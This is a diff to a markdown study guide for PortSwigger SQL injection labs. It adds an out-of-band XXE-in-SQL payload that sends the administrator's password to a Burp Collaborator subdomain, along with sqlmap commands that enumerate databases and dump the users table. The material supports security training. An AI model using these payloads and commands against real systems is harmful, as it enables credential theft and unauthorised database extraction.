@@ -228,12 +228,54 @@ Connection: close
 
 ## SQL Injection Data Exfiltration
 
->Blind SQL injection vulnerability, in application used to perform an SQL query to extract data or login credentials from data for administratot. SQLMAP used to fast track the exploit and retrieve the sensitive information.  
+>Error based or Blind SQL injection vulnerabilities, in application used to perform an SQL query to extract data or login credentials from database for the administrator. SQLMAP is used to fast track the exploit and retrieve the sensitive information.  
+
+<sub>Adding a double or single quote to web parameters and evaluate the error message response, indicate possible SQL injection point.</sub>  
+
+[SQL Injection cheat sheet examples](https://portswigger.net/web-security/sql-injection/cheat-sheet)  
+
+![Identify the input parameter vulnerable to SQL injection](identify-sqli-parameter.png)  
+
+<sup>Out of band data exfiltration SQL query</sup>  
 
 ```sql
-select * from users;
-
-```
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+```  
 
 [PortSwigger Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)  
+
+### SQLMAP 
+
+>Sample SQLMAP commands to determine what SQL injection vulnerability exist and retrieving different types of information from backend database.  
+
+<sub>SQLMAP determine the vulnerability, and perform initial enumeration.</sub>  
+
+```bash
+sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3
+```  
+
+<sub>SQLMAP determine the database DBMS.</sub>  
+
+```bash
+sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -dbs
+```  
+
+<sub>SQLMAP determine Database, Tables, dump, data Exfiltration.</sub>  
+
+```bash
+sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -D public --tables
+
+sqlmap -v -u 'https://0a00000a03b7eef2c18913c400660003.web-security-academy.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --dbms=PostgreSQL -D public -T users --dump --level=3 --risk=3
+
+```  
+
+![SQLMAP used to dump data from tables](sqlmap-dump-table-data.png)
+
+
+<sub>Alternative SQLMAP if finding a blind boolean based vulnerability, and to speed up process the following command perform an error based technique.</sub>  
+
+```bash
+sqlmap -v -r request.txt -p 'category' --batch --flush-session --dbms postgresql --technique E --level=5  
+```
+
 
